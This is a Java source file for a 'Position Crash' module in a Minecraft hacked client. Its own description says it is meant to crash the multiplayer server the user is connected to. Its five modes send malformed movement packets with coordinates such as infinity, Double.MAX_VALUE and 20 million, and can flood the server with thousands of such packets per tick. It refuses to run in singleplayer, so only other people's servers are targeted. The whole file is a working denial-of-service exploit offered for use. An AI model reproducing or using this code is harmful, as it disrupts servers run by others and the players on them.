package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.entity.player.PlayerMoveEvent;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.mixininterface.IVec3d;
import mathax.client.settings.*;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.utils.Utils;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

import java.util.Objects;


public class PositionCrash extends Module {

    private final Setting<Modes> packetMode;

    private final Setting<Integer> amount;

    private final Setting<Boolean> autoDisable;

    private final Setting<Boolean> onground;

    public PositionCrash() {
        super(Categories.Crash, Items.BRICKS, "Position Crash", "CRYSTAL || Attempts to crash the server you are connected to bny sending broken position packets.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        packetMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which position crash to use.")
            .defaultValue(Modes.TWENTY_MILLION)
            .build()
        );
        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(500)
            .min(1)
            .sliderMin(1)
            .sliderMax(10000)
            .build()
        );
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
        );
        onground = sgGeneral.add(new BoolSetting.Builder()
            .name("On Ground")
            .description("Decide if you want the packets to be onGround or not.")
            .defaultValue(true)
            .build()
        );
    }

    private boolean Switch = false;

    @Override
    public boolean onActivate() {
        if(!mc.isInSingleplayer()) {
            if (Utils.canUpdate()) {
                switch (packetMode.get()) {
                    case TWENTY_MILLION -> {
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(20_000_000, 255, 20_000_000, onground.get()));
                        toggle();
                    }

                    case INFINITY -> {
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, onground.get()));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, onground.get()));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(Double.POSITIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.POSITIVE_INFINITY, Float.POSITIVE_INFINITY, Float.NEGATIVE_INFINITY, onground.get()));
                        toggle();
                    }

                    case TP -> Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, onground.get()));
                    case VELT, SWITCH -> {
                    }
                }
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
        return false;
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        if(!mc.isInSingleplayer()) {
            switch (packetMode.get()) {
                case TP -> {
                    for (double i = 0; i < amount.get(); i++) {
                        assert mc.player != null;
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * 9), mc.player.getZ(), onground.get()));
                    }
                    for (double i = 0; i < amount.get() * 10; i++) {
                        assert mc.player != null;
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * (double) amount.get()), mc.player.getZ() + (i * 9), onground.get()));
                    }
                }
                case VELT -> {
                    assert mc.player != null;
                    if (mc.player.age < 100) {
                        for (int i = 0; i < amount.get(); i++) {
                            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ(), onground.get()));
                            for (double v : new double[]{Double.MAX_VALUE, mc.player.getY() - 1.0D}) {
                                mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), v, mc.player.getZ(), onground.get()));
                            }
                        }
                    }
                }
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onMove(PlayerMoveEvent event) {
        if (Utils.canUpdate()) {
            if (Objects.requireNonNull(packetMode.get()) == Modes.SWITCH) {
                if (Switch) {
                    ((IVec3d) event.movement).set(Double.MIN_VALUE, event.movement.getY(), Double.MIN_VALUE);
                    Switch = false;
                } else {
                    ((IVec3d) event.movement).set(Double.MAX_VALUE, event.movement.getY(), Double.MAX_VALUE);
                    Switch = true;
                }
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        TWENTY_MILLION,
        INFINITY,
        TP,
        VELT,
        SWITCH
    }
}
